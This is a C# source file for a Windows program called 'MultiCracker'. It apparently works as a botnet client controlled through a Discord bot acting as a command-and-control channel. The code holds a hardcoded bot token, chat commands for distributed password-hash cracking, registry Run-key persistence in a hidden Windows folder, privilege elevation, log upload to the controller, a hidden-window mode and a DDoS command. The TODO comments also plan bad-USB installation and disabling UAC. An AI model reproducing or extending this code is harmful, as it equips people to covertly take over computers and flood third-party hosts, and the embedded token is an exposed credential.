using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using Discord;
using Discord.WebSocket;
using System.Threading.Tasks;
using Microsoft.VisualBasic.Logging;
using Discord.Commands;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading.Channels;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Security.Principal;

namespace MultiCracker
{

    public partial class Form1 : Form
    {
        // ----------------------------------------
        // TODO:
        // ----------------------------------------
        // DONE: Add a way to split the cracking between bots
        // DONE: Add a way to set the hash to crack
        // Add a way to set the hash algorithm (More algorithms)
        // Faster splitting (splitting without needing to to through all password combinations.)
        // DONE: Better checking for if bots are active or not
        // DONE: Add DDoS commands for the bots (Full on botnet style...)
        // DONE: Bool for hiding form.
        // DONE: Add a way to install hidden persistence.
        // DONE: Quick bad USB install.
        // DONE: Add a way to send the log file to the C2.
        // Add a way to elevate to admin.
        // Disable UAC.
        // ----------------------------------------

        bool EmergencySTOP = false;
        private bool DebugMode = true;

        // Discord
        bool SomeoneElseFoundPassword = false;
        bool FoundCorrectPass = false;
        string elsesPassword = "N/A";
        string elsesHash = "N/A";
        int numbersOfComputers = 1;
        List<string> computers = new List<string>();

        string currentPassword = "";
        string hash;
        string password;

        // Force start/end
        int forceEnd = int.MaxValue; // As high as possible (default)
        int forceStart = 0; // All accepted. (0 is the default)


        // Hash settings
        string Algorithm = "SHA256";
        bool UseNumbers = true;
        bool UseLetters = false;
        bool UseSymbols = false;
        bool UseCapitals = false;
        int MaxLength = 3;
        int MinLength = 1;

        // Communication
        string BOT_TOKEN = "MTE4NDUwMDgwMzE2ODM3ODkwMA.GCBpcP.04tgAqrrDI5MUXzhrXonwkSMwfLwQRYWSNDnQs";

        int counter = 0;

        // Create timer
        static Stopwatch stopwatch = new Stopwatch();

        public Form1()
        {
            InitializeComponent();
            Task.Run(() => DiscordThread());
        }


        // Debug or not
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!DebugMode)
            {
                Visible = false; // Hide form window.
                ShowInTaskbar = false; // Remove from taskbar.
                Opacity = 0;
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode disabled. (Hidden Window)"));
            }
            else
            {
                Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode enabled."));
            }
        }


        // Discord
        private DiscordSocketClient _client;
        private async Task DiscordThread()
        {
            var config = new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Info,
                GatewayIntents = GatewayIntents.All // Enable all intents
            };

            _client = new DiscordSocketClient(config);
            _client.Log += Log;

            await _client.LoginAsync(TokenType.Bot, BOT_TOKEN);
            await _client.StartAsync();

            _client.Ready += async () =>
            {
                // Create new text channel in the server with the name "bot-logs" if it doesn't exist
                await CreateBotLogsChannel();
            };


            _client.MessageReceived += HandleMessage;
        }

        private Task Log(LogMessage arg)
        {
            // Handle logging (e.g., display in a TextBox)
            Invoke(new Action(() =>
            {
                txtOutput.AppendText(arg + "\r\n");
            }));

            return Task.CompletedTask;
        }

        private async Task HandleMessage(SocketMessage arg)
        {
            // Ignore system messages and messages from other bots
            bool allowBotMessages = true;
            if (allowBotMessages == false)
            {
                if (arg.Author.IsBot)
                    return;
            }
            if (arg is not IUserMessage message)
                return;

            bool heavyLoging = false;
            if (heavyLoging)
            {
                Log(new LogMessage(LogSeverity.Info, "Message", "Message event triggered."));

                // Check the type of the message
                Log(new LogMessage(LogSeverity.Info, "Message", $"Message type: {arg.Type}"));

                // Check for embeds or attachments
                if (message.Embeds.Any())
                    Log(new LogMessage(LogSeverity.Info, "Message", "Message contains embeds."));
                if (message.Attachments.Any())
                    Log(new LogMessage(LogSeverity.Info, "Message", "Message contains attachments."));

                // Log the raw content of the message
                Log(new LogMessage(LogSeverity.Info, "Message", $"Raw message content: {message.Content}"));
            }

            // Trim the message content to remove leading and trailing whitespaces
            string trimmedContent = message.Content.Trim();

            // Check if the message is from created channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            if (message.Channel != channel)
            {
                // The message is not from the created channel
                return;
            }

            if (!string.IsNullOrEmpty(trimmedContent))
            {
                Log(new LogMessage(LogSeverity.Info, "Message", $"Received message: {trimmedContent}"));
                // BASIC
                if (trimmedContent == "!help")
                {
                    // Send a message to the channel
                    string help_message = "Hello! I am a bot that can crack passwords and more. Here are my commands:\r\n";
                    help_message += "**-------------- BASIC --------------**\r\n";
                    help_message += "**!help** - Displays this message.\r\n";
                    help_message += "\r\n**-------------- CRACKING --------------**\r\n";
                    help_message += "**!crack** - Starts cracking the password.\r\n";
                    help_message += "**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n";
                    help_message += "**!stop** - Stops cracking the password.\r\n";
                    help_message += "**!setHash** - Sets the hash to crack.\r\n";
                    help_message += "**!status** - Sends status.\r\n";
                    help_message += "**!info** - Sends info.\r\n";
                    help_message += "**!reset** - Resets the bot.\r\n";
                    help_message += "**!setMax <length>** - Sets the passwords max length.\r\n";
                    help_message += "**!setMin <length>** - Sets the passwords min length.\r\n";
                    help_message += "**!setLetters <true/false>** - Sets the password to use letters.\r\n";
                    help_message += "**!setNumbers <true/false>** - Sets the password to use numbers.\r\n";
                    help_message += "**!setSymbols <true/false>** - Sets the password to use symbols.\r\n";
                    help_message += "**!setCapitals <true/false>** - Sets the password to use capitals.\r\n";
                    help_message += "**!split** - Splits the cracking between bots.\r\n";
                    help_message += "**!start <start-count>, <end-count>** - Starts cracking from <start-count> to <end-count>. (Mostly for bots to use...)\r\n";
                    help_message += "\r\n**-------------- OTHER --------------**\r\n";
                    help_message += "**!kys** - Bot commits suicide...\r\n";
                    help_message += "\r\n**-------------- DEBUG --------------**\r\n";
                    help_message += "**!log** - Sends entire log as .txt file.\r\n";
                    help_message += "\r\n**-------------- PERSISTENCE --------------**\r\n";
                    help_message += "**!install** - Installs persistence.\r\n";
                    help_message += "**!uninstall** - Uninstalls persistence.\r\n";
                    help_message += "\r\n**-------------- DDoS --------------**\r\n";
                    help_message += "**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n";
                    help_message += "**!stopddos** - Stops all DDoS attacks.\r\n";
                    await message.Channel.SendMessageAsync(help_message);
                    Log(new LogMessage(LogSeverity.Info, "Message", $"Sent help message."));
                }
                // CRACKING
                else if (trimmedContent == "!crack")
                {
                    // Simulate a button press of btnStartCracking
                    btnStartCracking_Click(null, null);
                    await message.Channel.SendMessageAsync("Cracking started... Use **!status** it see its progress!");
                }
                else if (trimmedContent == "!crackAll")
                {
                    // Find all other bots (including itself)
                    computers = FindOthers();
                    // Log the active computers
                    foreach (var computer in computers)
                    {
                        // Send discord message (!crack)
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                        await channel.SendMessageAsync("!crack");
                        Log(new LogMessage(LogSeverity.Info, "Cracking", $"Started cracking with bot-{computer}..."));
                    }
                    // Send discord message
                    await message.Channel.SendMessageAsync("Cracking started on all bots... Use **!status** it see its progress!");
                }
                else if (trimmedContent == "!stop")
                {
                    btnStopCracking_Click(null, null);
                    await message.Channel.SendMessageAsync("Pushed Emergency Eutton!!! This will halt any cracking.");
                }
                else if (trimmedContent.StartsWith("!setHash"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(9);
                    hash = argument;
                    txtTargetHash.Text = hash;

                    await message.Channel.SendMessageAsync($"Set hash to: **{hash}**");
                }
                else if (trimmedContent.StartsWith("!setAlgorithm"))
                {
                    // Find the argument after !setAlgorithm
                    string argument = trimmedContent.Substring(14);

                    // Check if the argument is valid
                    if (argument == "SHA256" || argument == "SHA512" || argument == "MD5" || argument == "SHA1" || argument == "SHA384" || argument == "HMACSHA256" || argument == "HMACSHA512" || argument == "HMACMD5")
                    {
                        Algorithm = argument;
                        await message.Channel.SendMessageAsync($"Set algorithm to: **{Algorithm}**");
                        textBox6.Text = Algorithm;
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync($"Invalid argument. Please use \"SHA256\", \"SHA512\", \"MD5\", \"SHA1\", \"SHA384\", \"HMACSHA256\", \"HMACSHA512\" or \"HMACMD5\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setMax"))
                {
                    // Find the argument after !setMaxLength
                    string maxLength = trimmedContent.Substring(7);
                    MaxLength = Convert.ToInt32(maxLength);
                    txtMax.Text = maxLength;

                    // Return responce with "Max length set to: <length>"
                    await message.Channel.SendMessageAsync($"Max length set to: **{maxLength}**");

                    Log(new LogMessage(LogSeverity.Info, "Password", $"Max length set to: {maxLength}"));
                }
                else if (trimmedContent.StartsWith("!setMin"))
                {
                    // Find the argument after !setMinLength
                    string minLength = trimmedContent.Substring(7);
                    MinLength = Convert.ToInt32(minLength);
                    txtMin.Text = minLength;

                    // Return responce with "Min length set to: <length>"
                    await message.Channel.SendMessageAsync($"Min length set to: **{minLength}**");

                    Log(new LogMessage(LogSeverity.Info, "Password", $"Min length set to: {minLength}"));
                }
                else if (trimmedContent == "!status")
                {
                    if (counter > 0)
                    {
                        Invoke(new Action(() =>
                        {
                            string status = GetStatus();
                            message.Channel.SendMessageAsync(status);
                            Log(new LogMessage(LogSeverity.Info, "Status", $"Status: {status}"));
                        }));
                    }
                    else
                    {
                        // Send a message to the channel
                        await message.Channel.SendMessageAsync("Cracking has not started yet. Use **!crack**...");
                        Log(new LogMessage(LogSeverity.Info, "Status", $"Cracking has not started yet."));
                    }
                }
                else if (trimmedContent == "!info")
                {
                    string info = GetInfo();
                    await message.Channel.SendMessageAsync(info);
                    Log(new LogMessage(LogSeverity.Info, "Info", $"Info: {info}"));
                }
                else if (trimmedContent == "!reset")
                {
                    hash = "";
                    Algorithm = "SHA256";
                    UseNumbers = false;
                    UseLetters = false;
                    UseSymbols = false;
                    UseCapitals = false;
                    MaxLength = 8;
                    MinLength = 5;
                    counter = 0;
                    stopwatch.Reset();
                    forceEnd = int.MaxValue;
                    forceStart = 0;
                    await message.Channel.SendMessageAsync("Reset settings.");
                    Log(new LogMessage(LogSeverity.Info, "Message", "Reset settings."));
                }
                else if (trimmedContent.StartsWith("!setLetters"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseLetters = true;
                        await message.Channel.SendMessageAsync("Letters enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseLetters = false;
                        await message.Channel.SendMessageAsync("Letters disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setNumbers"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseNumbers = true;
                        await message.Channel.SendMessageAsync("Numbers enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseNumbers = false;
                        await message.Channel.SendMessageAsync("Numbers disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setCapitals"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(13);

                    if (argument == "true")
                    {
                        UseCapitals = true;
                        await message.Channel.SendMessageAsync("Capitals enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseCapitals = false;
                        await message.Channel.SendMessageAsync("Capitals disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent.StartsWith("!setSymbols"))
                {
                    // Find the argument after !sethash
                    string argument = trimmedContent.Substring(12);

                    if (argument == "true")
                    {
                        UseSymbols = true;
                        await message.Channel.SendMessageAsync("Symbols enabled.");
                    }
                    else if (argument == "false")
                    {
                        UseSymbols = false;
                        await message.Channel.SendMessageAsync("Symbols disabled.");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync("Invalid argument. Please use \"true\" or \"false\".");
                    }
                }
                else if (trimmedContent == "!split")
                {
                    // Find other bots
                    computers = FindOthers();
                    // Log the active computers
                    foreach (var computer in computers)
                    {
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Found active computer: {computer}"));
                    }
                    // Split the cracking between the bots
                    int numberOfComputers = computers.Count;

                    // Calculate the number of combinations
                    long combinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations: " + combinations));

                    // Calculate the number of combinations per bot
                    long combinationsPerBot = combinations / numberOfComputers;
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations per bot: " + combinationsPerBot));

                    // Send out the settings to the other bots
                    foreach (var computer in computers)
                    {
                        // Access their own channel
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");

                        // Change "False/True" to "false/true" so that it works as argument.
                        string UseLettersString = UseLetters.ToString().ToLower();
                        string UseNumbersString = UseNumbers.ToString().ToLower();
                        string UseSymbolsString = UseSymbols.ToString().ToLower();
                        string UseCapitalsString = UseCapitals.ToString().ToLower();

                        // Send the settings
                        await channel.SendMessageAsync($"!setMax {MaxLength}");
                        await channel.SendMessageAsync($"!setMin {MinLength}");
                        await channel.SendMessageAsync($"!setLetters {UseLettersString}");
                        await channel.SendMessageAsync($"!setNumbers {UseNumbersString}");
                        await channel.SendMessageAsync($"!setSymbols {UseSymbolsString}");
                        await channel.SendMessageAsync($"!setCapitals {UseCapitalsString}");
                        await channel.SendMessageAsync($"!setHash {hash}");
                    }

                    // Split the possible passwords between the bots
                    // Generate passwords

                    // Create a list of passwords
                    List<string> passwords = new List<string>();

                    // Generate passwords
                    foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
                    {
                        // THIS IS WHERE IT TAKES A LONG TIME, I NEED TO FIND A WAY TO MAKE IT FASTER. Potential fix could be 
                        passwords.Add(password);
                    }

                    // Split the list of passwords between the bots
                    int numberOfPasswords = passwords.Count;
                    int passwordsPerBot = numberOfPasswords / numberOfComputers;
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of passwords per bot: " + passwordsPerBot));

                    // Take the first X passwords and send them to the first bot
                    // Take the next X passwords and send them to the next bot
                    // Repeat until all bots have gotten their passwords

                    // Create a list of lists of passwords
                    List<List<string>> passwordsPerBotList = new List<List<string>>();
                    Log(new LogMessage(LogSeverity.Info, "Password", "Number of lists of passwords: " + numberOfComputers));

                    // Create a list of passwords for each bot, and add it to the list of lists of passwords, send out passwordsPerBotList to the bots.
                    for (int i = 0; i < numberOfComputers; i++)
                    {
                        passwordsPerBotList.Add(new List<string>());
                        Log(new LogMessage(LogSeverity.Info, "Password", $"Created list of passwords for bot {i}"));


                        // Add passwords to the list of passwords for each bot
                        int botIndex = i % numberOfComputers;
                        if (i < passwordsPerBotList[botIndex].Count)
                        {
                            passwordsPerBotList[botIndex].Add(passwords[i]);
                            Log(new LogMessage(LogSeverity.Info, "Password", $"Added password {passwords[i]} to bot {botIndex}"));
                        }


                        // Send the passwords to the bots
                        // Figure out a start and end password for each bot
                        int start = 0;
                        int end = numberOfPasswords;
                        int splits = numberOfComputers;

                        List<Tuple<int, int>> splitRanges = SplitRange(start, end, splits);

                        // Display the result
                        foreach (var range in splitRanges)
                        {
                            Log(new LogMessage(LogSeverity.Info, "Password", $"Range: {range.Item1} - {range.Item2}"));
                        }

                        // Send "!start <start>, <end>" to each bot.
                        // Access their own channel
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computers[i]}");

                        // Send the settings
                        await channel.SendMessageAsync($"!start {splitRanges[i].Item1}, {splitRanges[i].Item2}");
                    }

                }
                else if (trimmedContent.StartsWith("!start"))
                {
                    // Find the 2 argument after !start seperated by a space
                    string argument = trimmedContent.Substring(7);
                    string[] arguments = argument.Split(", ");

                    // Set variables
                    forceStart = Convert.ToInt32(arguments[0]);
                    forceEnd = Convert.ToInt32(arguments[1]);

                    // Logging
                    Log(new LogMessage(LogSeverity.Info, "Password", $"Start: {arguments[0]}"));
                    Log(new LogMessage(LogSeverity.Info, "Password", $"End: {arguments[1]}"));

                    // Send message to discord
                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    computerNameRaw = Environment.MachineName;
                    computerName = computerNameRaw.ToLower();
                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    await channel2.SendMessageAsync($"Start: {arguments[0]}");
                    await channel2.SendMessageAsync($"End: {arguments[1]}");
                }
                // OTHER
                else if (trimmedContent == "!kys")
                {
                    // Send a discord message
                    await message.Channel.SendMessageAsync("Unaliving myself...");

                    // Choose a random last word
                    Random random = new Random();
                    int randomNumber = random.Next(0, 10);
                    string[] lastWords = {
                        "I told you I was sick. - Spike Milligan",
                        "I'm bored with it all. - Winston Churchill",
                        "Either this wallpaper goes, or I do. - Oscar Wilde",
                        "It's very beautiful over there. - Thomas Edison",
                        "I'd hate to die twice. It's so boring. - Richard Feynman",
                        "I am not the least afraid to die. - Charles Darwin",
                        "Why is this happening? - Lady Nancy Astor",
                        "I've had 18 straight whiskies. I think that's the record. - Dylan Thomas",
                        "This is no way to live! - Groucho Marx",
                        "I should never have switched from Scotch to Martinis. - Humphrey Bogart",
                        "I'm going to the bathroom to read. - Elvis Presley",
                        "I am ready. - Woodrow Wilson",
                        "What is life? It is the flash of a firefly in the night. - Crowfoot",
                        "I hope the exit is joyful and I hope never to return. - Frida Kahlo",
                        "I'm losing it. - Frank Sinatra",
                        "I feel great. - Elvis Presley",
                        "It's better to burn out than to fade away. - Kurt Cobain",
                        "Goodbye, everybody. - Hart Crane",
                        "I have offended God and mankind because my work did not reach the quality it should have. - Leonardo da Vinci",
                        "I'm going to the bathroom to read. - Elvis Presley",
                        "I've had a hell of a lot of fun and I've enjoyed every minute of it. - Errol Flynn",
                        "Why not? After all, it belongs to him. - Charlie Chaplin (when asked why he was looking down at the ground before he died)",
                        "What's the big hurry? - Ronald Reagan",
                        "I'm bored. - James Brown",
                        "Now comes the mystery. - Henry Ward Beecher",
                        "I've never felt better. - Douglas Fairbanks",
                        "Please put out that light, James. - Louisa May Alcott"
                    };
                    string lastWord = lastWords[randomNumber];

                    // Send a discord message
                    await message.Channel.SendMessageAsync(lastWord);
                    // Kill the bot
                    Environment.Exit(0);
                }
                else if (trimmedContent == "!elevate")
                {
                    // Check if admin
                    bool isAdmin = IsAdministrator();
                    if (!isAdmin)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Elevating to admin...");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Elevate", $"Elevating to admin..."));

                        // Elevate to admin
                        await Task.Run(() => ElevateToAdmin());
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Already admin.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Elevate", $"Already admin."));
                    }
                }
                // DEBUG
                else if (trimmedContent == "!log")
                {
                    try
                    {
                        string log = txtOutput.Text;
                        string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");
                        File.WriteAllText(fullPath, log);
                        // Send the file (NOT AS NORMAL TEXT)
                        await message.Channel.SendFileAsync(fullPath);

                        Log(new LogMessage(LogSeverity.Info, "Message", $"Sent log file to C2."));
                        // Remove log
                        File.Delete(fullPath);
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Error sending log file: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending log file: {ex.Message}"));
                    }
                }
                // PERSISTENCE
                else if (trimmedContent == "!install")
                {
                    // Using registry to install persistence

                    // Variables
                    string keyName = "MultiCracker";
                    bool fullPersistenceInstalled = false;
                    bool exePersistenceInstalled = false;
                    bool regeditPersistenceInstalled = false;
                    string dropPoint = "C:\\Windows\\debug\\multi";
                    string exePath = Application.ExecutablePath;
                    string exeName = Path.GetFileName(exePath);
                    string fullExePath = Path.Combine(dropPoint, exeName);


                    // Check if regedit persistence is already installed
                    RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    string[] subKeys = keyCheck.GetValueNames();
                    foreach (string subKey in subKeys)
                    {
                        if (subKey == keyName)
                        {
                            regeditPersistenceInstalled = true;
                        }
                    }

                    // Check if the executable is in droppoint
                    if (File.Exists(fullExePath))
                    {
                        exePersistenceInstalled = true;
                    }

                    // Check if both are installed
                    if (regeditPersistenceInstalled && exePersistenceInstalled)
                    {
                        fullPersistenceInstalled = true;
                    }

                    if (fullPersistenceInstalled)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Persistence is already installed.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is already installed."));
                        return;
                    }
                    else
                    {
                        // Log whats missing for full persistence
                        if (!regeditPersistenceInstalled)
                        {
                            await message.Channel.SendMessageAsync($"Regedit persistence is not installed. Fixing...");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed. Fixing..."));
                        }
                        if (!exePersistenceInstalled)
                        {
                            await message.Channel.SendMessageAsync($"Exe persistence is not installed. Fixing...");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed. Fixing..."));
                        }

                        // Check if admin
                        bool isAdmin = IsAdministrator();
                        if (!isAdmin)
                        {
                            // Send discord message
                            await message.Channel.SendMessageAsync($"Error installing persistence. Not admin. (Use **!elevate** to ask for elevation)");
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin."));
                            return;
                        }
                        else
                        {
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing persistence..."));

                            // Set important variables
                            exePath = Application.ExecutablePath;
                            exeName = Path.GetFileName(exePath);
                            keyName = "MultiCracker";
                            dropPoint = "C:\\Windows\\debug\\multi";

                            // Check if dropPoint directory exists
                            if (!Directory.Exists(dropPoint))
                            {
                                // Create directory
                                Directory.CreateDirectory(dropPoint);
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPoint}"));
                            }
                            else
                            {
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPoint}"));
                            }

                            try
                            {
                                // Move everything in current directory to drop point
                                string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
                                foreach (string file in files)
                                {
                                    string fileName = Path.GetFileName(file);
                                    string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
                                    string newFilePath = Path.Combine(dropPoint, fileName);
                                    File.Move(fullFilePath, newFilePath);
                                    // Log
                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
                                }
                            }
                            catch (Exception ex)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error moving files to drop point: {ex.Message}");
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error moving files to drop point: {ex.Message}"));
                            }

                            // Create registry key
                            try
                            {
                                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                string newExePath = Path.Combine(dropPoint, exeName);
                                key.SetValue(keyName, newExePath);
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Installed persistence.");
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
                            }
                            catch (Exception ex)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
                            }
                        }
                    }


                }
                else if (trimmedContent == "!uninstall")
                {
                    // Using registry to uninstall persistence

                    // Variables
                    string keyName = "MultiCracker";
                    bool anyPersistenceInstalled = false;
                    bool exePersistenceInstalled = false;
                    bool regeditPersistenceInstalled = false;
                    string dropPoint = "C:\\Windows\\debug\\multi";
                    string exePath = Application.ExecutablePath;
                    string exeName = Path.GetFileName(exePath);
                    string fullExePath = Path.Combine(dropPoint, exeName);


                    // Check if regedit persistence is already installed
                    RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    string[] subKeys = keyCheck.GetValueNames();
                    foreach (string subKey in subKeys)
                    {
                        if (subKey == keyName)
                        {
                            regeditPersistenceInstalled = true;
                        }
                    }

                    // Check if the executable is in droppoint
                    if (File.Exists(fullExePath))
                    {
                        exePersistenceInstalled = true;
                    }

                    // Check if both are installed
                    if (regeditPersistenceInstalled || exePersistenceInstalled)
                    {
                        anyPersistenceInstalled = true;
                    }

                    if (anyPersistenceInstalled)
                    {
                        // Log whats missing for full persistence
                        if (regeditPersistenceInstalled)
                        {
                            await message.Channel.SendMessageAsync($"Regedit persistence is installed. Removing...");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is installed. Removing..."));
                        }
                        if (exePersistenceInstalled)
                        {
                            await message.Channel.SendMessageAsync($"Exe persistence is installed. Removing...");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is installed. Removing..."));
                        }

                        // Check if admin
                        bool isAdmin = IsAdministrator();

                        // if not admin
                        if (!isAdmin)
                        {
                            // Send discord message
                            await message.Channel.SendMessageAsync($"Error uninstalling persistence. Not admin. (Use **!elevate** to ask for elevation)");
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin."));
                            return;
                        }
                        else
                        {
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling persistence..."));

                            // Delete registry key
                            try
                            {
                                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                key.DeleteValue(keyName);
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Removed registry key!");
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
                                regeditPersistenceInstalled = false;
                            }
                            catch (Exception ex)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
                            }

                            // Delete files in drop point
                            try
                            {
                                string[] files = Directory.GetFiles(dropPoint);
                                foreach (string file in files)
                                {
                                    string fileName = Path.GetFileName(file);
                                    string fullFilePath = Path.Combine(dropPoint, fileName);
                                    File.Delete(fullFilePath);
                                    // Log
                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPoint}"));
                                }
                                exePersistenceInstalled = false;
                            }
                            catch (Exception ex)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error deleting files from drop point: {ex.Message}");
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting files from drop point: {ex.Message}"));
                            }

                            // Delete drop point
                            try
                            {
                                Directory.Delete(dropPoint);
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Deleted drop point!");
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted drop point!"));
                            }
                            catch (Exception ex)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error deleting drop point: {ex.Message}");
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting drop point: {ex.Message}"));
                            }

                            // Check if both are installed
                            if (regeditPersistenceInstalled || exePersistenceInstalled)
                            {
                                anyPersistenceInstalled = true;
                            }

                            if (!anyPersistenceInstalled)
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Persistence uninstalled!");
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence uninstalled!"));
                            }
                            else
                            {
                                // Send discord message
                                await message.Channel.SendMessageAsync($"Error uninstalling persistence. Please try again.");
                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Please try again."));

                                // Send discord message and log what is still installed
                                if (regeditPersistenceInstalled)
                                {
                                    await message.Channel.SendMessageAsync($"Regedit persistence is still installed.");
                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is still installed."));
                                }
                                if (exePersistenceInstalled)
                                {
                                    await message.Channel.SendMessageAsync($"Exe persistence is still installed.");
                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is still installed."));
                                }
                            }
                        }
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Persistence is not installed.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
                    }

                }
                // DDoS
                else if (trimmedContent.StartsWith("!ddos"))
                {
                    // Get the aruments (!ddos <ip> <port> <time>)
                    string argument = trimmedContent.Substring(6);
                    string[] arguments = argument.Split(" ");

                    // Check if the arguments are valid
                    if (arguments.Length == 3)
                    {
                        // Get the arguments
                        string ip = arguments[0];
                        string port = arguments[1];
                        string time = arguments[2];

                        // Send discord message
                        await message.Channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} for {time} seconds...");

                        // Start DDoS attack
                        await Task.Run(() => DDoS(ip, port, time));
                    }
                    else
                    {
                        // Send discord message
